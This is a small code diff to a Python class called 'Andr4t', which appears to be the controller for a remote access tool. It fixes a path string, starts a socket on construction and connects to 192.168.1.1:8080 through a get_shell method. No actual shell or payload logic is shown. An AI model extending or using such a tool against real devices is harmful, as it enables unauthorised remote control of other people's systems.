@@ -3,7 +3,7 @@ import sys
 from pathlib import Path
 
 parent_dir = str(Path(__file__).parent.parent)
-sys.path.append(parent_dir + '\tcp')
+sys.path.append(parent_dir + r'\tcp')
 from tcp import Socket
 
 #  _   _ _  _   _              _              _      _  _   _
@@ -16,9 +16,10 @@ from tcp import Socket
 class Andr4t:
     def __init__(self, ip, port) -> None:
         self.socket = Socket(ip, port)
+        self.socket.start()
     
     def get_shell(self) -> None:
         if(not self.socket.start()):
             return
         
-Andr4t.get_shell()
+andr4t = Andr4t("192.168.1.1", "8080")
